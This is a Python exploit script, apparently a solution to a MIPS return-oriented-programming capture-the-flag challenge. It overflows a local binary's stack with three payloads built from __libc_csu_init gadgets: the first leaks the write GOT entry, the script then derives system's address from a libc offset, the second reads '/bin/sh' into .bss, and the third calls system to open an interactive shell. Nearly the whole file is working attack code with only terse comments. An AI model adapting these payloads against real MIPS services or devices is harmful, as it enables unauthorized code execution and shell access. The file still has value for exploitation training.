#/usr/bin/env python
from zio import *
import sys
import struct

p = zio('./rop')

write_plt = 0x40052c
write_got = 0x4108F0
vuln_addr = 0x400670
bss_addr = 0x410930
read_got = 0x4108EC

p.read_until("Welcome to mips ROP!\n")
'''
Find your gadgets in __libc_csu_init
.text:00400770                 lw      $t9, 0($s1)
.text:00400774                 addiu   $s0, 1
.text:00400778                 move    $a0, $s3
.text:0040077C                 move    $a1, $s4
.text:00400780                 jalr    $t9
.text:00400784                 move    $a2, $s5
.text:00400788                 sltu    $v0, $s0, $s2
.text:0040078C                 bnez    $v0, loc_400770
.text:00400790                 addiu   $s1, 4
.text:00400794
.text:00400794 loc_400794:     # CODE XREF: __libc_csu_init+60
.text:00400794                 lw      $ra, 0x34($sp)
.text:00400798                 lw      $s5, 0x30($sp)
.text:0040079C                 lw      $s4, 0x2C($sp)
.text:004007A0                 lw      $s3, 0x28($sp)
.text:004007A4                 lw      $s2, 0x24($sp)
.text:004007A8                 lw      $s1, 0x20($sp)
.text:004007AC                 lw      $s0, 0x1C($sp)
.text:004007B0                 jr      $ra
.text:004007B4                 addiu   $sp, 0x38
'''
#write(1, write_got, 4)
call_addr = 0x00400770
lw7_addr = 0x00400794
s0 = 0
s1 = write_got
s2 = 1
s3 = 1
s4 = write_got
s5 = 4
ra  = call_addr
payload1 = 'a'*36 + b32(lw7_addr) + 'a'*0x1c 
payload1 += b32(s0) + b32(s1) + b32(s2)
payload1 += b32(s3) + b32(s4) + b32(s5) + b32(ra)
payload1 += 'a'*56 + b32(vuln_addr)

raw_input('g0')
p.writeline(payload1)
raw_input('g0')
write_addr = struct.unpack('>I', p.read(4))[0]
print "[+] write_addr: " + hex(write_addr)
off = 0xe9cf8 - 0x41da0
system_addr = write_addr - off
print "[+] system_addr: " + hex(system_addr)

#read(0, bss_addr, 100)
call_addr = 0x00400770
lw7_addr = 0x00400794
s0 = 0
s1 = read_got
s2 = 1
s3 = 0
s4 = bss_addr
s5 = 100
ra  = vuln_addr
payload2 = 'a'*36 + b32(lw7_addr) + 'a'*0x1c #padding
payload2 += b32(s0) + b32(s1) + b32(s2)
payload2 += b32(s3) + b32(s4) + b32(s5) + b32(ra) 
p.writeline(payload2)

p.writeline(b32(system_addr) + "/bin/sh\x00")

##system('/bin/sh')
call_addr = 0x00400770
lw7_addr = 0x00400794
s0 = 0
s1 = bss_addr
s2 = 1
s3 = bss_addr + 8
s4 = bss_addr
s5 = 100
ra  = 0xdeadbeef
payload3 = 'a'*36 + b32(lw7_addr) + 'a'*0x1c #padding
payload3 += b32(s0) + b32(s1) + b32(s2)
payload3 += b32(s3) + b32(s4) + b32(s5) + b32(ra) 
p.writeline(payload3)

p.interact()
